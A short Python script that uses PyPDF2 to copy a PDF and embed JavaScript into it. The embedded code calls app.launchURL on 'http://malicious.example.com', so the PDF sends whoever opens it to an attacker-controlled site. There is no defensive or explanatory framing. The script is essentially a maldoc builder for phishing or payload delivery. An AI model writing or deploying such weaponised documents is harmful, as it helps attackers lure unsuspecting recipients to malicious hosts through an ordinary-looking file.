from PyPDF2 import PdfFileReader, PdfFileWriter

def add_javascript_to_pdf(input_pdf, output_pdf, javascript):
    pdf_reader = PdfFileReader(input_pdf)
    pdf_writer = PdfFileWriter()

    for page_num in range(pdf_reader.getNumPages()):
        page = pdf_reader.getPage(page_num)
        pdf_writer.addPage(page)

    pdf_writer.addJS(javascript)

    with open(output_pdf, "wb") as out_pdf:
        pdf_writer.write(out_pdf)

javascript_code = """
app.launchURL("http://malicious.example.com", true);
"""

add_javascript_to_pdf("pdf_with_js.pdf", "pdf_with_embedded_js.pdf", javascript_code)
